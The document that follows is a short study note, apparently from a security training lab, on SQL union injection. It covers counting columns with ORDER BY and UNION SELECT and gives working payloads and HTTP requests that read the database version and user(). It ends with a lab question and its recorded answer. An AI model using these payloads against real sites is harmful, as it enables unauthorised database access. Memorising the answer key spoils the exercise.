# Union Injection
## Detect number of columns
### Using ORDER BY
Start by `order by 1` then increase the column number until we get a fail. For example, if we fail at `order by 4`, this means the table has only 3 columns.

### Using UNION
The first method always returns the results until we hit an error, while this method always gives an error until we get a success. Which means, increment until we get a success:

```sql
cn' UNION select 1,2,3-- -
```

## Location of injection
It is very common that not every column will be displayed back to the user. For example, the ID field is often used to link different tables together, but the user doesn't need to see it. This tells us that columns 2 and 3, and 4 are printed to place our injection in any of them. `We cannot place our injection at the beginning, or its output will not be printed.`

```sql
cn' UNION select 1,@@version,3,4-- -
```

## Questions
1. Use a Union injection to get the result of 'user()' **Answer: root@localhost**
   - First probe for the number of columns of the affected table using the UNION method → `4` columns:
        ```
        GET /search.php?port_code=%27+UNION+SELECT+1,2,3,4--+ HTTP/1.1
        ```
   - Notice that column 2,3,4 are shown on the response, inject the user() command into one of those columns to read the result:
        ```
        GET /search.php?port_code=%27+UNION+SELECT+1,2,user(),4--+ HTTP/1.1
        ```